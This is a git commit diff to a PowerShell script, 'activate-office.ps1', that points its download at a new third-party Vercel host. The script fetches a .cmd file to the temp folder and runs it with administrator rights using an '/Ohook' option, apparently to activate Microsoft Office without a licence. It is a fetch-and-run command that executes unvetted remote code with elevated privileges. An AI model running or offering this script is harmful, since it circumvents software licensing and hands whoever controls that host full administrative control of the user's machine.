4bdc0c23f01050276978e68d9c79aceb6920fa00
bparihar <bparihar93@gmail.com>
2026-06-06 13:00:32 +0530

    Update activate-office.ps1

--- activate-office.ps1
+++ activate-office.ps1
@@ -1,3 +1,3 @@
 $tmp = "$env:TEMP\MAS_AIO.cmd"
-Invoke-WebRequest "https://your-project.vercel.app/MAS_AIO.cmd" -OutFile $tmp
+Invoke-WebRequest "https://friendlyactivation.vercel.app/MAS_AIO.cmd" -OutFile $tmp
 Start-Process cmd.exe -ArgumentList "/c `"$tmp`" /Ohook" -Verb RunAs
